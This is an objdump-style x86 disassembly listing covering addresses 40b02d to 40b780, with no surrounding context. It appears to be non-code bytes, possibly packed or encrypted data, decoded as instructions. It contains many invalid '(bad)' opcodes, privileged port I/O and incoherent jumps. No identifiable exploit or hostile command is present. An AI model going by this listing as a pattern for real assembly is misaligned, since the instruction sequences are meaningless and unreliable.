  40b02d:	ror    BYTE PTR [eax+0x446533ca],1
  40b033:	mov    gs,WORD PTR [ebx]
  40b035:	push   es
  40b036:	sbb    bh,BYTE PTR [edi+eiz*2-0x8]
  40b03a:	mov    ecx,0x98fa5907
  40b03f:	stc    
  40b040:	and    esp,DWORD PTR ds:0x9abc6f4e
  40b046:	mov    ?,WORD PTR [ecx+0x4c36c3d]
  40b04c:	xor    BYTE PTR [edi],dh
  40b04e:	in     al,0xae
  40b050:	xchg   ebp,eax
  40b051:	ja     0x40b0be
  40b053:	add    bh,dh
  40b055:	inc    ecx
  40b056:	sub    al,0xe8
  40b058:	xchg   edi,eax
  40b059:	mov    ?,WORD PTR [ebp-0x12]
  40b05c:	mov    dl,0xea
  40b05e:	jle    0x40b0b5
  40b060:	xchg   esp,eax
  40b061:	mov    WORD PTR [ebp+0x2c8fe02],ds
  40b067:	push   ebp
  40b068:	push   0x1402721a
  40b06d:	fisub  DWORD PTR [edx]
  40b06f:	fnstcw WORD PTR [ebp+0x23]
  40b072:	les    esi,FWORD PTR [eax-0x4e]
  40b075:	pcmpeqd mm7,mm0
  40b078:	fwait
  40b079:	xchg   esp,eax
  40b07a:	mov    edi,0xd4772972
  40b07f:	cs (bad) 
  40b082:	or     al,BYTE PTR [edi+0xd]
  40b085:	aaa    
  40b086:	or     esp,DWORD PTR [eax]
  40b088:	(bad)  
  40b089:	sbb    DWORD PTR [eax-0x1b],esi
  40b08c:	and    DWORD PTR [ebx-0x4b23c8f5],esi
  40b092:	inc    esp
  40b093:	cmp    BYTE PTR es:[esp+eax*1+0xc7f3ea5],dl
  40b09b:	and    BYTE PTR [ecx-0x28],bl
  40b09e:	sub    dh,BYTE PTR [esi-0x20]
  40b0a1:	ret    0xdc7b
  40b0a4:	cmp    dh,al
  40b0a6:	mov    al,ds:0x3cdbc310
  40b0ab:	jge    0x40b0b9
  40b0ad:	in     eax,dx
  40b0ae:	imul   cx,WORD PTR [ebp+0x4eeb21ce],0x903e
  40b0b7:	xchg   edx,eax
  40b0b8:	jmp    DWORD PTR [esi+0x6ec40d39]
  40b0be:	pushf  
  40b0bf:	or     DWORD PTR [esi],eax
  40b0c1:	and    al,0x45
  40b0c3:	addr16 mov bl,0xf
  40b0c6:	add    dh,BYTE PTR [esp+ebx*1-0x65]
  40b0ca:	mov    ds:0x87ca5ab3,eax
  40b0cf:	loopne 0x40b127
  40b0d1:	rcr    DWORD PTR [edi],0xe0
  40b0d4:	jae    0x40b134
  40b0d6:	(bad)  
  40b0d7:	test   eax,0xbdc4bc66
  40b0dc:	jno    0x40b0a1
  40b0de:	fsin   
  40b0e0:	mov    WORD PTR [esi],?
  40b0e2:	data16 scas al,BYTE PTR es:[edi]
  40b0e4:	sar    BYTE PTR [ebx+0x5fd73bbe],1
  40b0ea:	dec    esp
  40b0eb:	pusha  
  40b0ec:	jp     0x40b0e8
  40b0ee:	call   0xeef9b416
  40b0f3:	sub    ebx,DWORD PTR [edi-0x20]
  40b0f6:	fistp  QWORD PTR [esp+edi*1-0x5c]
  40b0fa:	jle    0x40b11c
  40b0fc:	lock sub DWORD PTR [ebx+eax*4],0xffffff99
  40b101:	js     0x40b0f2
  40b103:	aas    
  40b104:	sar    BYTE PTR [esi-0x44],1
  40b107:	push   ecx
  40b108:	adc    DWORD PTR [ebx+0x3c],ecx
  40b10b:	mov    ds:0x11cf4156,al
  40b110:	rol    DWORD PTR [edx],0xe9
  40b113:	cmp    al,0x1f
  40b115:	mov    dh,0x1a
  40b117:	arpl   WORD PTR [ebx],sp
  40b119:	or     eax,0x6220a9c
  40b11e:	adc    bl,0x1c
  40b121:	mov    ebx,es
  40b123:	mov    dh,0x99
  40b125:	mov    eax,ds:0x5f2b82cd
  40b12a:	popf   
  40b12b:	ins    BYTE PTR es:[edi],dx
  40b12c:	nop
  40b12d:	mov    bl,BYTE PTR [edx+ebp*8-0x76ae9dce]
  40b134:	jg     0x40b113
  40b136:	mov    cl,0xed
  40b138:	ins    DWORD PTR es:[edi],dx
  40b139:	pop    ss
  40b13a:	hlt    
  40b13b:	cmp    BYTE PTR [esi+ecx*4-0x4a],al
  40b13f:	push   es
  40b140:	add    al,0x2b
  40b142:	out    dx,eax
  40b143:	add    bl,BYTE PTR [ecx-0x7c]
  40b146:	cmc    
  40b147:	sub    esp,ecx
  40b149:	xchg   DWORD PTR [esi+0x4319eb69],esp
  40b14f:	test   DWORD PTR [ebx+0x19],edx
  40b152:	test   esi,ebp
  40b154:	das    
  40b155:	mov    eax,ds:0xcf6f3636
  40b15a:	aam    0x92
  40b15c:	and    ebp,DWORD PTR [esi]
  40b15e:	pop    ss
  40b15f:	sub    eax,0xbda3dfdd
  40b164:	jnp    0x40b10d
  40b166:	sti    
  40b167:	je     0x40b15c
  40b169:	lock pushf 
  40b16b:	lods   eax,DWORD PTR ds:[esi]
  40b16c:	sbb    bl,BYTE PTR [edi-0x5968e326]
  40b172:	mov    esp,0x856e3215
  40b177:	cli    
  40b178:	ficom  DWORD PTR [edi]
  40b17a:	enter  0xce77,0x26
  40b17e:	and    BYTE PTR [ebx+0x38f0e999],dh
  40b184:	daa    
  40b185:	out    0xad,eax
  40b187:	sub    eax,0x13cb6c
  40b18c:	popf   
  40b18d:	gs add eax,0x4de62fc1
  40b193:	scas   al,BYTE PTR es:[edi]
  40b194:	daa    
  40b195:	add    bh,BYTE PTR [ebx]
  40b197:	test   BYTE PTR [eax+0x388fccca],al
  40b19d:	ja     0x40b200
  40b19f:	adc    DWORD PTR [esi-0x5432a39],ebx
  40b1a5:	mov    ebx,0x3329619f
  40b1aa:	(bad)  
  40b1ab:	(bad)  
  40b1ac:	jmp    0x40b21b
  40b1ae:	ficomp DWORD PTR ds:0xe092d406
  40b1b4:	xchg   edx,eax
  40b1b5:	icebp  
  40b1b6:	inc    ebx
  40b1b7:	cs xchg ecx,eax
  40b1b9:	mov    ch,0x27
  40b1bb:	add    BYTE PTR es:[eax+0x33baf1ba],dl
  40b1c2:	cs xor al,0x46
  40b1c5:	or     DWORD PTR [ebx],ecx
  40b1c7:	fcomp  DWORD PTR [esi+edi*2-0x57]
  40b1cb:	aaa    
  40b1cc:	xor    ebx,ecx
  40b1ce:	(bad)  
  40b1d0:	mov    dl,0x92
  40b1d2:	xchg   BYTE PTR [ecx],ah
  40b1d4:	or     al,0xff
  40b1d6:	adc    esi,esp
  40b1d8:	or     esi,DWORD PTR [ebp+0x76e9afb9]
  40b1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1df:	xchg   DWORD PTR ds:0x570829ea,ecx
  40b1e5:	jmp    0x79f:0x427d8d70
  40b1ec:	data16 das 
  40b1ee:	popa   
  40b1ef:	pop    esp
  40b1f0:	pop    ss
  40b1f1:	es xchg esp,eax
  40b1f3:	xchg   ebp,eax
  40b1f4:	jle    0x40b218
  40b1f6:	sub    edi,DWORD PTR [edi+0x73]
  40b1f9:	mov    eax,0xac51423e
  40b1fe:	pushf  
  40b1ff:	out    0xf1,al
  40b201:	mov    ecx,0xbce322bf
  40b206:	test   eax,0x12af58e6
  40b20b:	jle    0x40b21f
  40b20d:	adc    edx,ebp
  40b20f:	inc    edi
  40b210:	push   esi
  40b211:	or     eax,0xeaccc4cf
  40b216:	leave  
  40b217:	not    BYTE PTR [ebp-0x28]
  40b21a:	adc    dh,BYTE PTR [edi-0x77c01150]
  40b220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b221:	or     BYTE PTR [edi-0x32be1406],0x2e
  40b228:	xor    al,0xf8
  40b22a:	xor    eax,0xfb2b8e8a
  40b22f:	lds    edi,FWORD PTR [edi-0x5f]
  40b232:	and    eax,0xc1f5d28
  40b237:	(bad)  
  40b238:	jns    0x40b1bf
  40b23a:	jle    0x40b216
  40b23c:	add    edx,DWORD PTR [esi+0x77]
  40b23f:	sub    al,0x5
  40b241:	push   ebp
  40b242:	and    DWORD PTR [esp+ecx*2-0x22e1306d],ebp
  40b249:	mov    ah,0xe3
  40b24b:	fwait
  40b24c:	popf   
  40b24d:	loope  0x40b276
  40b24f:	add    al,0x2d
  40b251:	stos   BYTE PTR es:[edi],al
  40b252:	dec    edx
  40b253:	dec    ebp
  40b254:	cmp    al,0x2e
  40b256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b257:	frstpm(287 only) 
  40b259:	repnz or edx,DWORD PTR [eax]
  40b25c:	cld    
  40b25d:	jl     0x40b29e
  40b25f:	xlat   BYTE PTR ds:[ebx]
  40b260:	neg    edx
  40b262:	stos   BYTE PTR es:[edi],al
  40b263:	mov    bh,0x41
  40b265:	inc    edx
  40b266:	popa   
  40b267:	fdiv   QWORD PTR [edi-0x44]
  40b26a:	frstor [ecx-0x5f8b6032]
  40b270:	in     eax,dx
  40b271:	(bad)  
  40b272:	in     eax,dx
  40b273:	cmp    DWORD PTR [eax-0x1e7d5f96],esp
  40b279:	(bad)  
  40b27a:	xor    edx,ebp
  40b27c:	mov    al,0xa9
  40b27e:	jge    0x40b2bd
  40b280:	xchg   esp,eax
  40b281:	jbe    0x40b246
  40b283:	adc    ch,al
  40b285:	push   es
  40b286:	cmc    
  40b287:	rcr    BYTE PTR [edx],1
  40b289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b28a:	sub    bl,BYTE PTR [ecx+esi*2+0x6d8fe05b]
  40b291:	cmp    BYTE PTR [ebp-0x2b],dh
  40b294:	pop    eax
  40b295:	pop    ecx
  40b296:	sbb    al,0x57
  40b298:	mov    al,ds:0x50a04be1
  40b29d:	(bad)  
  40b29e:	shl    BYTE PTR [edx],cl
  40b2a0:	fadd   st,st(5)
  40b2a2:	aad    0x1a
  40b2a4:	outs   dx,DWORD PTR ds:[esi]
  40b2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2a6:	jmp    0x6b53:0x66e42393
  40b2ad:	gs psrad mm0,mm3
  40b2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2b2:	rcl    edi,0xab
  40b2b5:	jne    0x40b268
  40b2b7:	dec    ebx
  40b2b8:	sbb    cl,BYTE PTR [eax]
  40b2ba:	or     dh,BYTE PTR [ecx]
  40b2bc:	inc    ebp
  40b2bd:	test   al,0x6d
  40b2bf:	mov    eax,gs
  40b2c1:	bound  esp,QWORD PTR [esi-0x36de8a7]
  40b2c7:	sbb    eax,0xf5c195ea
  40b2cc:	in     al,0x7d
  40b2ce:	outs   dx,DWORD PTR ds:[esi]
  40b2cf:	retf   
  40b2d0:	mov    edi,0xf28ab54
  40b2d5:	in     al,dx
  40b2d6:	pop    esi
  40b2d7:	ins    BYTE PTR es:[edi],dx
  40b2d8:	cmp    DWORD PTR [ecx-0x51],esp
  40b2db:	jo     0x40b316
  40b2dd:	aam    0x99
  40b2df:	loop   0x40b355
  40b2e1:	dec    edi
  40b2e2:	mov    es,WORD PTR [eax-0x1c]
  40b2e5:	cmc    
  40b2e6:	cdq    
  40b2e7:	dec    esp
  40b2e8:	cmc    
  40b2e9:	and    edx,DWORD PTR [ebp-0x6e]
  40b2ec:	jl     0x40b2e6
  40b2ee:	dec    edi
  40b2ef:	sbb    edi,DWORD PTR [esi+0x6828b5c4]
  40b2f5:	shr    BYTE PTR [ecx+0x76],1
  40b2f8:	ja     0x40b301
  40b2fa:	das    
  40b2fb:	ficom  WORD PTR [edx]
  40b2fd:	shl    esp,cl
  40b2ff:	lods   eax,DWORD PTR ds:[esi]
  40b300:	dec    edx
  40b301:	imul   edi,DWORD PTR [edx-0x72],0x61
  40b305:	inc    ebp
  40b306:	inc    edx
  40b307:	pop    ss
  40b308:	xchg   ebx,eax
  40b309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b30a:	or     edx,eax
  40b30c:	je     0x40b344
  40b30e:	pusha  
  40b30f:	adc    BYTE PTR [ecx+edi*4],dh
  40b312:	xor    BYTE PTR [esi+edi*4],dl
  40b315:	cmp    DWORD PTR [edi+0x1b],esp
  40b318:	scas   al,BYTE PTR es:[edi]
  40b319:	call   0x7b5e8532
  40b31e:	loope  0x40b2ca
  40b320:	retf   0x2a4
  40b323:	pop    ebp
  40b324:	inc    ebp
  40b325:	call   0xfc0a:0x56e2e12e
  40b32c:	cwde   
  40b32d:	xor    eax,0xac8a97f0
  40b332:	or     BYTE PTR [si],ah
  40b335:	jbe    0x40b38a
  40b337:	push   eax
  40b338:	cwde   
  40b339:	fistp  QWORD PTR [edx-0x65]
  40b33c:	xlat   BYTE PTR ds:[ebx]
  40b33d:	repnz aam 0x80
  40b340:	mov    gs,WORD PTR [ecx]
  40b342:	jmp    0x40b354
  40b344:	cmp    edi,DWORD PTR [eax-0x26]
  40b347:	mov    ebp,0xaf7a780
  40b34c:	(bad)  
  40b34d:	dec    esi
  40b34e:	pop    edi
  40b34f:	stos   DWORD PTR es:[edi],eax
  40b350:	inc    esp
  40b351:	mov    bl,0x4a
  40b353:	cs xchg esp,eax
  40b355:	push   ebp
  40b356:	not    ch
  40b358:	adc    BYTE PTR [edx-0x4ef04954],0xfd
  40b35f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b360:	jl     0x40b36d
  40b362:	sbb    DWORD PTR [ecx-0x60b3e833],ebp
  40b368:	dec    edi
  40b369:	xor    eax,0x8204325e
  40b36e:	xor    ebp,DWORD PTR [ecx+0x2adab995]
  40b374:	bswap  esi
  40b376:	rcl    ecx,cl
  40b378:	mov    ah,0x63
  40b37a:	daa    
  40b37b:	fwait
  40b37c:	(bad)  {k6}
  40b381:	out    dx,eax
  40b382:	les    eax,FWORD PTR [ebx-0x5c]
  40b385:	push   0x59
  40b387:	xchg   ebx,eax
  40b388:	inc    edi
  40b389:	push   es
  40b38a:	add    edx,DWORD PTR [ecx-0x44]
  40b38d:	bound  edi,QWORD PTR [esi+0x395e64d1]
  40b393:	iret   
  40b394:	mov    al,0xc5
  40b396:	xchg   BYTE PTR [ebx],dl
  40b398:	lods   eax,DWORD PTR ds:[esi]
  40b399:	pop    esi
  40b39a:	push   ecx
  40b39b:	retf   0x71ad
  40b39e:	lods   al,BYTE PTR ds:[esi]
  40b39f:	pop    eax
  40b3a0:	mov    BYTE PTR [ebx+edi*4+0x3aa3a62a],bh
  40b3a7:	out    0x8c,eax
  40b3a9:	push   edi
  40b3aa:	sub    al,0x83
  40b3ac:	daa    
  40b3ad:	call   0x7f0f:0x50f36d6e
  40b3b4:	sub    dh,BYTE PTR [ebx+eiz*4-0x48]
  40b3b8:	pop    ebp
  40b3b9:	clc    
  40b3ba:	sbb    ecx,ebx
  40b3bc:	nop
  40b3bd:	aaa    
  40b3be:	retf   0x80d6
  40b3c1:	jge    0x40b37e
  40b3c3:	mov    ecx,0xcea95bb1
  40b3c8:	cdq    
  40b3c9:	fs sbb eax,0x95d32969
  40b3cf:	push   ss
  40b3d0:	and    BYTE PTR [ecx],ah
  40b3d2:	jnp    0x40b452
  40b3d4:	cli    
  40b3d5:	jl     0x40b3ae
  40b3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d8:	jecxz  0x40b42e
  40b3da:	and    BYTE PTR [eax],ch
  40b3dc:	aam    0xcd
  40b3de:	mov    esi,0xc6c3718b
  40b3e3:	in     al,dx
  40b3e4:	cmp    al,0x87
  40b3e6:	mov    esi,DWORD PTR [ebp+0x4f39d72f]
  40b3ec:	clc    
  40b3ed:	jbe    0x40b3eb
  40b3ef:	adc    eax,0xb9c6b89f
  40b3f4:	mov    ss,WORD PTR [esi+0x447e726b]
  40b3fa:	dec    eax
  40b3fb:	add    edx,DWORD PTR [ecx-0x5999c140]
  40b401:	adc    ebp,edi
  40b403:	mov    BYTE PTR [ebx+0x39],ch
  40b406:	enter  0x9500,0xc7
  40b40a:	push   ecx
  40b40b:	in     eax,dx
  40b40c:	ja     0x40b3e0
  40b40e:	jns    0x40b3f4
  40b410:	adc    ax,0x8af5
  40b414:	ror    BYTE PTR ds:0x90a7cc66,cl
  40b41a:	and    edi,DWORD PTR [edi+edx*1+0x73]
  40b41e:	inc    edi
  40b41f:	in     al,0x2
  40b421:	fdivr  DWORD PTR [edx]
  40b423:	loopne 0x40b428
  40b425:	shl    BYTE PTR [ebp-0x3a2c8198],0x52
  40b42c:	xor    DWORD PTR [esi+ebp*4],esp
  40b42f:	cmp    al,BYTE PTR [esi+ecx*2-0x3]
  40b433:	dec    edi
  40b434:	int    0x9d
  40b436:	pop    ebx
  40b437:	aaa    
  40b438:	(bad)  
  40b439:	pushf  
  40b43a:	xchg   esp,eax
  40b43b:	cmp    al,0xc5
  40b43d:	push   edi
  40b43e:	aas    
  40b43f:	inc    eax
  40b440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b441:	aad    0x47
  40b443:	jns    0x40b478
  40b445:	or     DWORD PTR [edi],edx
  40b447:	aam    0xc7
  40b449:	mov    ecx,0xbbc5e24d
  40b44e:	cmp    BYTE PTR [edx+0x6b],al
  40b451:	arpl   WORD PTR [ebx-0x4aa23062],cx
  40b457:	sub    esi,DWORD PTR [edx+edx*2]
  40b45a:	and    al,0xd5
  40b45c:	push   esp
  40b45d:	xor    al,0xc7
  40b45f:	cld    
  40b460:	jo     0x40b4b4
  40b462:	outs   dx,DWORD PTR ds:[esi]
  40b463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b464:	test   DWORD PTR [ebx-0xa],ebp
  40b467:	xchg   esp,eax
  40b468:	arpl   WORD PTR [edi+0x3b],dx
  40b46b:	stc    
  40b46c:	loope  0x40b4ac
  40b46e:	mov    DWORD PTR [ecx],esp
  40b470:	mov    cl,0x99
  40b472:	stos   DWORD PTR es:[edi],eax
  40b473:	push   ecx
  40b474:	clc    
  40b475:	jne    0x40b42f
  40b477:	adc    al,0xb2
  40b479:	add    bh,0xeb
  40b47c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47d:	push   cs
  40b47e:	xlat   BYTE PTR ds:[ebx]
  40b47f:	pop    ebx
  40b480:	jne    0x40b49e
  40b482:	mov    ds:0xb313dca8,eax
  40b487:	mov    ah,BYTE PTR [ecx+ebx*8+0x42]
  40b48b:	add    al,0x25
  40b48d:	imul   esi,DWORD PTR [ebx-0x26ef9c7d],0xe96fba89
  40b497:	ins    DWORD PTR es:[edi],dx
  40b498:	mov    esp,0x6f658d05
  40b49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b49e:	out    dx,al
  40b49f:	inc    eax
  40b4a0:	icebp  
  40b4a1:	sbb    eax,0x50779d8b
  40b4a6:	mov    ds:0x26c254a7,eax
  40b4ab:	loopne 0x40b4cd
  40b4ad:	jne    0x40b4cd
  40b4af:	cmp    BYTE PTR [ecx],0x74
  40b4b2:	xor    esi,DWORD PTR [edx-0x7052564d]
  40b4b8:	rcl    ebx,1
  40b4ba:	push   0xd7d26f51
  40b4bf:	icebp  
  40b4c0:	jnp    0x40b4b5
  40b4c2:	(bad)  
  40b4c3:	jmp    0x35bdcb5c
  40b4c8:	lahf   
  40b4c9:	sub    ch,BYTE PTR [esi+esi*8+0x62]
  40b4cd:	sbb    BYTE PTR [ebx-0x62],ch
  40b4d0:	push   0x2b
  40b4d2:	cdq    
  40b4d3:	sbb    al,0x5b
  40b4d5:	scas   al,BYTE PTR es:[edi]
  40b4d6:	call   0xeacd9411
  40b4db:	data16 sti 
  40b4dd:	icebp  
  40b4de:	lods   al,BYTE PTR ds:[esi]
  40b4df:	push   0xb0c818b4
  40b4e4:	sub    edi,eax
  40b4e6:	in     al,0x14
  40b4e8:	(bad)  
  40b4e9:	stos   BYTE PTR es:[edi],al
  40b4ea:	into   
  40b4eb:	and    al,0x81
  40b4ed:	lahf   
  40b4ee:	dec    ebx
  40b4ef:	add    edi,eax
  40b4f1:	jle    0x40b534
  40b4f3:	shl    BYTE PTR [eax+0x42],1
  40b4f6:	xlat   BYTE PTR ds:[ebx]
  40b4f7:	cmp    ch,al
  40b4f9:	shl    edx,1
  40b4fb:	rep ins BYTE PTR es:[edi],dx
  40b4fd:	push   esi
  40b4fe:	repz adc ebx,esp
  40b501:	push   ebp
  40b502:	pop    ds
  40b503:	aam    0x62
  40b505:	shl    DWORD PTR [edx-0xa7cabdb],1
  40b50b:	inc    edi
  40b50c:	(bad)  
  40b50d:	jae    0x40b54c
  40b50f:	and    esi,esi
  40b511:	ins    DWORD PTR es:[edi],dx
  40b512:	shl    WORD PTR [ebx+0x6ad38577],1
  40b519:	xlat   BYTE PTR fs:[ebx]
  40b51b:	or     BYTE PTR [ecx],bh
  40b51d:	gs adc ax,0xf4d
  40b522:	add    eax,0xc6c8e17d
  40b527:	pushf  
  40b528:	inc    ebx
  40b529:	sar    BYTE PTR [ebx+0x466e1517],cl
  40b52f:	rol    edx,0x96
  40b532:	and    BYTE PTR [edx-0x1e],ch
  40b535:	fistp  DWORD PTR [edx+0x20fa1251]
  40b53b:	js     0x40b5b2
  40b53d:	push   edi
  40b53e:	ret    0x243f
  40b541:	adc    eax,0x50d5ec78
  40b546:	psrad  mm5,mm0
  40b549:	adc    ebx,DWORD PTR ss:[eax+edx*1+0x617d1b9e]
  40b551:	out    0x25,al
  40b553:	shl    edx,1
  40b555:	fmul   QWORD PTR [ebx+0x25]
  40b558:	add    bh,BYTE PTR [edi]
  40b55a:	mov    DWORD PTR [ecx-0x7ddbabb4],esi
  40b560:	adc    ebp,DWORD PTR [edx+ebp*4]
  40b563:	sbb    BYTE PTR [edi],cl
  40b565:	mov    bl,0x1d
  40b567:	add    al,0xd7
  40b569:	fwait
  40b56a:	es mov eax,0xe9b6c23e
  40b570:	mov    WORD PTR [eax+0x34472dbc],cs
  40b576:	test   BYTE PTR [edx],0x1a
  40b579:	pushf  
  40b57a:	adc    DWORD PTR [esi+0x5a],ecx
  40b57d:	in     eax,0x80
  40b57f:	ffreep st(1)
  40b581:	pop    ds
  40b582:	mov    edx,0x73cd400e
  40b587:	lods   al,BYTE PTR ds:[esi]
  40b588:	ja     0x40b56e
  40b58a:	lea    ebx,[ebx+edx*8-0x68]
  40b58e:	mov    cs,WORD PTR [ebp-0x4e73b111]
  40b594:	cs push ecx
  40b596:	mov    ch,0xc9
  40b598:	neg    BYTE PTR [ebp-0x40]
  40b59b:	(bad)  
  40b59c:	mov    esi,0x15b2ca67
  40b5a1:	repz je 0x40b606
  40b5a4:	mov    dl,0x8d
  40b5a6:	sbb    al,0x52
  40b5a8:	push   DWORD PTR [ebp-0x37b52648]
  40b5ae:	mov    esi,0x277b771
  40b5b3:	mul    BYTE PTR [esi]
  40b5b5:	jecxz  0x40b53f
  40b5b7:	mov    ch,0xa7
  40b5b9:	jmp    0xc8c3:0x37626200
  40b5c0:	add    BYTE PTR [ecx-0x17dac457],dh
  40b5c6:	cmp    al,al
  40b5c8:	mov    WORD PTR [ecx-0x7e],ds
  40b5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5cc:	shr    DWORD PTR [edi+0x7a],1
  40b5cf:	add    eax,0x4e670494
  40b5d4:	sub    DWORD PTR [ebx+eax*8+0x17439c83],edi
  40b5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5dc:	lahf   
  40b5dd:	mov    edx,0x38a9f515
  40b5e2:	and    al,BYTE PTR [ebx]
  40b5e4:	ret    0x1503
  40b5e7:	mov    ecx,0xbbe2d6e5
  40b5ec:	jae    0x40b65d
  40b5ee:	stc    
  40b5ef:	dec    eax
  40b5f0:	mov    edi,0xf36955b3
  40b5f5:	out    0x82,al
  40b5f7:	std    
  40b5f8:	xchg   DWORD PTR [eax+0x26],eax
  40b5fb:	nop
  40b5fc:	(bad)  
  40b5fd:	fstp   TBYTE PTR [esi+0x2226354b]
  40b603:	fbld   TBYTE PTR [ecx-0x73]
  40b606:	cmp    esi,edx
  40b608:	or     DWORD PTR [ebp-0x28],esp
  40b60b:	iret   
  40b60c:	fcmovne st,st(4)
  40b60e:	hlt    
  40b60f:	jle    0x40b650
  40b611:	xchg   bp,ax
  40b613:	push   0x17f637ed
  40b618:	shl    BYTE PTR [esi+0x697f6bf1],1
  40b61e:	psubusb mm3,QWORD PTR [edi+0x5b]
  40b622:	test   BYTE PTR [esi+ecx*4+0x77],cl
  40b626:	rcr    DWORD PTR [ecx],0x84
  40b629:	clc    
  40b62a:	pop    es
  40b62b:	scas   eax,DWORD PTR es:[edi]
  40b62c:	mov    al,0xb9
  40b62e:	cli    
  40b62f:	mov    eax,0x1dd317af
  40b634:	xchg   esi,eax
  40b635:	jle    0x40b5ea
  40b637:	addr16 dec si
  40b63a:	inc    edx
  40b63b:	add    eax,0x1d71af80
  40b640:	mov    edi,esp
  40b642:	fwait
  40b643:	in     eax,0x5c
  40b645:	jne    0x40b63f
  40b647:	xlat   BYTE PTR ds:[ebx]
  40b648:	add    eax,0x1d912d5e
  40b64d:	adc    cl,bh
  40b64f:	push   eax
  40b650:	jns    0x40b63f
  40b652:	xor    eax,0xbb62e11f
  40b657:	add    dh,ch
  40b659:	sub    al,0x26
  40b65b:	call   0x3bfe:0xe326249b
  40b662:	mov    edx,0x93bbccaa
  40b667:	jp     0x40b63c
  40b669:	adc    BYTE PTR ds:0x2603f860,dh
  40b66f:	stos   BYTE PTR es:[edi],al
  40b670:	std    
  40b671:	stos   DWORD PTR es:[edi],eax
  40b672:	loope  0x40b633
  40b674:	repz in eax,0xf6
  40b677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b678:	cmp    al,0x41
  40b67a:	imul   edx,ebx,0xffffffc6
  40b67d:	cmp    DWORD PTR [ebx+0x35],ebp
  40b680:	inc    BYTE PTR [eax-0x1f]
  40b683:	adc    esi,DWORD PTR [ebp-0x23]
  40b686:	ss cmc 
  40b688:	lods   eax,DWORD PTR ds:[esi]
  40b689:	mov    cl,0x21
  40b68b:	and    DWORD PTR [esi],0x41f58b23
  40b691:	and    edx,edi
  40b693:	mov    ecx,0x60e953f9
  40b698:	fidiv  WORD PTR [edi]
  40b69a:	shr    esi,1
  40b69c:	rol    BYTE PTR [ebp-0x114114fb],0xc5
  40b6a3:	dec    edi
  40b6a4:	jl     0x40b6a3
  40b6a6:	dec    esi
  40b6a7:	test   dl,ah
  40b6a9:	fstp   st(1)
  40b6ab:	out    dx,al
  40b6ac:	jmp    0x4d08d6a0
  40b6b1:	lds    ebx,FWORD PTR [edx-0x17fba2d2]
  40b6b7:	xchg   BYTE PTR [esp+ebp*8+0x5efdd0b8],dh
  40b6be:	push   edx
  40b6bf:	push   esp
  40b6c0:	adc    ecx,DWORD PTR [edx+0x7d]
  40b6c3:	outs   dx,BYTE PTR ds:[esi]
  40b6c4:	lods   eax,DWORD PTR ds:[esi]
  40b6c5:	lds    esp,FWORD PTR [eax]
  40b6c7:	lds    edi,FWORD PTR [edi+0x75f403bb]
  40b6cd:	add    al,BYTE PTR [edx+0x74]
  40b6d0:	add    eax,0x9116f232
  40b6d5:	lahf   
  40b6d6:	cmp    al,0x2b
  40b6d8:	pusha  
  40b6d9:	lods   al,BYTE PTR ds:[esi]
  40b6da:	push   edx
  40b6db:	jmp    0x40b6f9
  40b6dd:	xchg   edx,eax
  40b6de:	mov    dh,0x1a
  40b6e0:	push   ebp
  40b6e1:	lds    eax,FWORD PTR [edi-0x44]
  40b6e4:	push   eax
  40b6e5:	outs   dx,DWORD PTR ds:[esi]
  40b6e6:	dec    edi
  40b6e7:	(bad)  
  40b6e8:	cmp    dl,al
  40b6ea:	iret   
  40b6eb:	call   0xec646659
  40b6f0:	or     DWORD PTR [edi],eax
  40b6f2:	cmp    ecx,DWORD PTR [eax]
  40b6f4:	inc    ecx
  40b6f5:	adc    bh,BYTE PTR [ebp-0x5c]
  40b6f8:	pop    edi
  40b6f9:	js     0x40b6fb
  40b6fb:	adc    BYTE PTR [eax+0x6d],0xf7
  40b6ff:	icebp  
  40b700:	aaa    
  40b701:	js     0x40b739
  40b703:	mov    bh,0xd8
  40b705:	xadd   BYTE PTR [eax],bh
  40b708:	int    0x1c
  40b70a:	xchg   DWORD PTR [ecx+edx*8+0x59f31d],esi
  40b711:	mov    al,dh
  40b713:	mov    esi,0x6518371d
  40b718:	js     0x40b76c
  40b71a:	add    eax,0x271b293d
  40b71f:	scas   al,BYTE PTR es:[edi]
  40b720:	sti    
  40b721:	shl    DWORD PTR [ebx-0x133fc74e],0xce
  40b728:	scas   al,BYTE PTR es:[edi]
  40b729:	or     esi,DWORD PTR [ecx-0xdf55227]
  40b72f:	sub    al,0x47
  40b731:	pop    edx
  40b732:	test   DWORD PTR [ebx-0x20],ebp
  40b735:	or     al,BYTE PTR [esi+eiz*1+0x3f]
  40b739:	xor    DWORD PTR [ecx],esp
  40b73b:	dec    ebx
  40b73c:	xchg   edx,eax
  40b73d:	jns    0x40b7a1
  40b73f:	mov    edi,0x60da8182
  40b744:	xlat   BYTE PTR ds:[ebx]
  40b745:	add    bl,BYTE PTR [ebx+ebx*8-0x6039a4b5]
  40b74c:	adc    DWORD PTR [esi-0x208ab040],eax
  40b752:	(bad)  
  40b753:	and    al,0x8f
  40b755:	sub    al,0xb8
  40b757:	mov    ebx,0x50470938
  40b75c:	cmp    BYTE PTR [edi+0x30],ah
  40b75f:	jns    0x40b7a7
  40b761:	dec    esi
  40b762:	inc    edx
  40b763:	pushf  
  40b764:	mov    esi,0x38eb0359
  40b769:	fistp  DWORD PTR [eax+0x2edea986]
  40b76f:	and    ebx,DWORD PTR [ebp+0x61eea4c8]
  40b775:	test   eax,0x4cb5a634
  40b77a:	out    0xa4,eax
  40b77c:	test   BYTE PTR [edx],cl
  40b77e:	add    BYTE PTR [eax],bl
  40b780:	xchg   edx,esp
